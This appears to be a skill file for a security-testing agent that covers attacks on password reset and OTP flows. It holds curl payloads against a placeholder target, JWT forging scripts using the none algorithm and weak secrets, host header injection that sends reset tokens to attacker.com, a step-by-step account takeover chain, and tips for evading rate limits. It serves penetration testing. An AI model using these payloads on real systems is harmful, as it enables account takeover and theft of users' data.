---
name: privilege_escalation_email_reset
description: Privilege escalation via email/password reset flaws including account takeover, OTP leakage, hash disclosure, reset token prediction, and host header injection
---

# Privilege Escalation via Email/Password Reset

Password reset and email verification flows are high-value targets for account takeover. Vulnerabilities include predictable tokens, OTP leakage, host header injection, and race conditions.

## Attack Surface

**Password Reset Flow**
- Forgot password → email with reset link/token
- Reset link contains token (JWT, UUID, hash)
- User clicks link → enters new password
- Token validated → password updated

**Email Verification Flow**
- Registration → email with verification link/code
- User clicks link or enters code
- Email marked as verified

**OTP (One-Time Password) Flow**
- Login/2FA → SMS/email with numeric code
- User enters code
- Code validated → access granted

**Account Recovery Flow**
- Security questions → reset link
- Backup email → reset link
- Admin-assisted recovery

## Detection Channels

**Static Analysis**
- Search for password reset endpoints: `/reset`, `/forgot`, `/recover`
- Check token generation: random, predictable, time-based?
- Check token validation: expiry, single-use, user binding?
- Check for host header usage in reset links
- Check for OTP in logs, responses, or error messages
- Check for rate limiting on reset requests

**Dynamic Analysis**
- Request password reset, inspect email/link
- Test token reuse (use same token twice)
- Test token expiry (use old token)
- Test token prediction (request multiple tokens, look for patterns)
- Test host header injection (modify Host header)
- Test OTP leakage (check response, logs, error messages)
- Test race conditions (send multiple reset requests simultaneously)

## Exploitation Techniques

### Predictable Reset Tokens

**Time-Based Tokens**
```bash
# Request multiple reset tokens, check for patterns
for i in {1..10}; do
  curl -X POST https://target.com/api/reset \
    -H "Content-Type: application/json" \
    -d '{"email": "attacker@test.com"}' \
    -c cookies_$i.txt
  sleep 1
done

# Extract tokens from emails (if accessible)
# Check if tokens are:
# - Sequential: token_1001, token_1002, token_1003
# - Time-based: 20240115120000, 20240115120001
# - Hash-based: md5(email + timestamp), sha256(user_id + time)
```

**Weak Random Tokens**
```python
# If tokens use weak PRNG (Math.random, rand(), etc.)
# Can predict future tokens after observing several

import random

# Observe 10 tokens
observed = [
    "a1b2c3d4",
    "e5f6g7h8",
    # ... 8 more
]

# If using Math.random() or similar, can reverse-engineer seed
# Then predict next tokens
```

**JWT Token Weaknesses**
```bash
# Decode JWT reset token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0LCJleHAiOjE3MDUzNDAwMDB9.signature" | cut -d. -f2 | base64 -d

# Check for:
# - Weak secret (try common secrets: "secret", "password", "123456")
# - None algorithm (change alg to "none", remove signature)
# - Algorithm confusion (change RS256 to HS256, use public key as secret)

# Test none algorithm
python3 << 'EOF'
import jwt
import base64

# Original token
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjM0fQ.signature"

# Decode payload
payload = jwt.decode(token, options={"verify_signature": False})

# Create new token with none algorithm
forged = jwt.encode(payload, "", algorithm="none")
print(forged)
EOF
```

### Host Header Injection

**Inject Malicious Host**
```bash
# Request password reset with modified Host header
curl -X POST https://target.com/api/reset \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# If vulnerable, reset email contains:
# https://attacker.com/reset?token=abc123
# Attacker controls attacker.com, captures token

# Try variations:
# - X-Forwarded-Host: attacker.com
# - X-Host: attacker.com
# - X-Forwarded-Server: attacker.com
# - Referer: https://attacker.com
```

**Password Reset Poisoning**
```bash
# Inject into email template
curl -X POST https://target.com/api/reset \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# Check if email contains attacker.com in reset link
```

### OTP/Code Leakage

**OTP in Response**
```bash
# Request OTP, check if returned in response
curl -X POST https://target.com/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890"}'

# Vulnerable response:
# {"success": true, "otp": "123456"}  ← OTP leaked!

# Or in error messages:
curl -X POST https://target.com/api/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "otp": "000000"}'

# Vulnerable response:
# {"error": "Invalid OTP. Correct OTP is 123456"}  ← OTP leaked!
```

**OTP in Logs**
```bash
# Check if OTP appears in:
# - Application logs
# - Browser console
# - Network responses
# - Email subject line

# Request OTP, then check logs
curl -X POST https://target.com/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# If you have log access, search for OTP
grep -i "otp\|code\|pin" /var/log/app.log
```

**OTP via Side Channel**
```bash
# Check if OTP length/type revealed in error messages
curl -X POST https://target.com/api/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "otp": "123"}'

# Vulnerable response:
# {"error": "OTP must be 6 digits"}  ← Reveals OTP format

# Or timing attack:
# Measure response time for different OTP lengths
# Longer response = correct length
```

### Hash/Token Disclosure

**Password Hash in Response**
```bash
# Check if password hash leaked in API responses
curl https://target.com/api/users/1234

# Vulnerable response:
# {
#   "id": 1234,
#   "email": "user@target.com",
#   "password_hash": "$2a$10$N9qo8uLOickgx2ZMRZoMye..."  ← Hash leaked!
# }

# Or in error messages:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@target.com", "password": "wrong"}'

# Vulnerable response:
# {"error": "Invalid password. Hash: $2a$10$..."}  ← Hash leaked!
```

**Reset Token in URL/Logs**
```bash
# Check if reset token appears in:
# - Browser history
# - Server logs
# - Referer header (when clicking link)

# Request reset, check logs
curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# If you have log access:
grep -i "reset\|token" /var/log/access.log
```

### Token Reuse & Expiry Bypass

**Token Reuse**
```bash
# Request password reset
curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# Extract token from email (assume: abc123)

# Use token to reset password
curl -X POST https://target.com/api/reset/confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "abc123", "password": "newpass123"}'

# Try to use same token again (should fail if single-use)
curl -X POST https://target.com/api/reset/confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "abc123", "password": "anotherpass"}'

# If successful → token reuse vulnerability
```

**Expired Token Bypass**
```bash
# Request reset, wait for token to expire (e.g., 24 hours)
# Then try to use expired token
curl -X POST https://target.com/api/reset/confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "expired_token", "password": "newpass123"}'

# Or modify token expiry (if JWT)
python3 << 'EOF'
import jwt
from datetime import datetime, timedelta

# Decode expired token
token = "expired.jwt.token"
payload = jwt.decode(token, options={"verify_signature": False})

# Extend expiry
payload["exp"] = int((datetime.now() + timedelta(days=1)).timestamp())

# Forge new token (if weak secret or none algorithm)
forged = jwt.encode(payload, "secret", algorithm="HS256")
print(forged)
EOF
```

### Race Conditions

**Multiple Reset Requests**
```bash
# Send many reset requests simultaneously
# Goal: generate multiple valid tokens, use one before others invalidated

for i in {1..100}; do
  curl -X POST https://target.com/api/reset \
    -H "Content-Type: application/json" \
    -d '{"email": "victim@target.com"}' &
done
wait

# Check emails (if accessible) for multiple tokens
# Use first token, then try others (should be invalidated)
```

**Concurrent Password Changes**
```bash
# Send multiple password change requests with same token
# Goal: one succeeds, others fail, but race condition allows multiple

for i in {1..10}; do
  curl -X POST https://target.com/api/reset/confirm \
    -H "Content-Type: application/json" \
    -d '{"token": "abc123", "password": "pass'$i'"}' &
done
wait

# Check which password works (if any)
```

### Email Enumeration

**Timing Attack**
```bash
# Measure response time for existing vs non-existing emails
time curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "existing@target.com"}'

time curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "nonexistent@target.com"}'

# If timing differs → email enumeration
# Existing email: 500ms (sends email)
# Non-existing: 100ms (returns immediately)
```

**Response Difference**
```bash
# Check if response differs for existing vs non-existing emails
curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "existing@target.com"}'
# Response: {"success": true, "message": "Reset email sent"}

curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "nonexistent@target.com"}'
# Response: {"error": "Email not found"}  ← Enumeration!
```

### Account Takeover via Reset

**Full Account Takeover**
```bash
# 1. Enumerate victim email
curl -X POST https://target.com/api/reset \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# 2. Exploit host header injection
curl -X POST https://target.com/api/reset \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'

# 3. Victim receives email with:
# https://attacker.com/reset?token=abc123

# 4. Victim clicks link, attacker captures token

# 5. Attacker uses token to reset password
curl -X POST https://target.com/api/reset/confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "abc123", "password": "attacker_controlled"}'

# 6. Attacker logs in with new password
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com", "password": "attacker_controlled"}'
```

## Bypass Techniques

**Bypass Token Expiry**
- Modify JWT expiry claim
- Use expired token before server checks expiry (race condition)
- Find endpoint that doesn't validate expiry

**Bypass Single-Use Tokens**
- Use token multiple times in parallel (race condition)
- Find endpoint that doesn't invalidate token after use
- Reuse token on different endpoint (e.g., `/reset` vs `/recover`)

**Bypass Rate Limiting**
- Distribute requests across multiple IPs
- Use array parameters: `email[]=victim@target.com&email[]=attacker@target.com`
- Send requests just below rate limit threshold
- Use slow requests to avoid triggering rate limit

**Bypass Host Header Validation**
- Use X-Forwarded-Host, X-Host, X-Forwarded-Server
- Use Referer header
- Use double Host header: `Host: target.com\r\nHost: attacker.com`
- Use Host with port: `Host: attacker.com:443`

## Validation

**Confirm Predictable Tokens**
- Request 10+ tokens, analyze for patterns
- Predict next token, use it to reset password
- Successfully reset password with predicted token

**Confirm Host Header Injection**
- Modify Host header, request reset
- Check if reset email contains attacker-controlled domain
- Capture token via attacker-controlled domain

**Confirm OTP Leakage**
- Request OTP, check if returned in response
- Check if OTP appears in error messages
- Check if OTP appears in logs

**Confirm Token Reuse**
- Use reset token once (successfully)
- Use same token again (should fail)
- If second use succeeds → token reuse vulnerability

**Confirm Race Condition**
- Send multiple reset requests simultaneously
- Check if multiple tokens generated
- Use one token, check if others still valid

**Avoid False Positives**
- Slow response ≠ email enumeration (could be rate limiting)
- Different response ≠ enumeration (could be different error handling)
- Token in URL ≠ vulnerability (check if logged, leaked via Referer)

## Impact

- **Account Takeover**: Attacker gains full control of victim account
- **Privilege Escalation**: Attacker resets admin password
- **Mass Account Compromise**: Predictable tokens allow bulk takeover
- **Data Breach**: Access to victim's sensitive data
- **Identity Theft**: Impersonate victim, perform actions as them
- **Financial Loss**: Access to payment methods, make purchases

## Pro Tips

1. **Always test host header injection** - most common reset vulnerability
2. **Test token reuse** - use same token twice, should fail
3. **Test token expiry** - use old token, should fail
4. **Test for OTP leakage** - check response, error messages, logs
5. **Test for hash disclosure** - check if password hash in API response
6. **Test rate limiting** - send 100 reset requests, check if blocked
7. **Test email enumeration** - compare response/time for existing vs non-existing
8. **Test race conditions** - send multiple requests simultaneously
9. **Test JWT weaknesses** - decode token, check algorithm, secret, expiry
10. **Test for side channels** - timing attacks, error messages, logs
11. **Use existing tools** - ffuf (for enumeration), jwt_tool (for JWT attacks)
12. **Document token format** - length, charset, structure (helps predict)
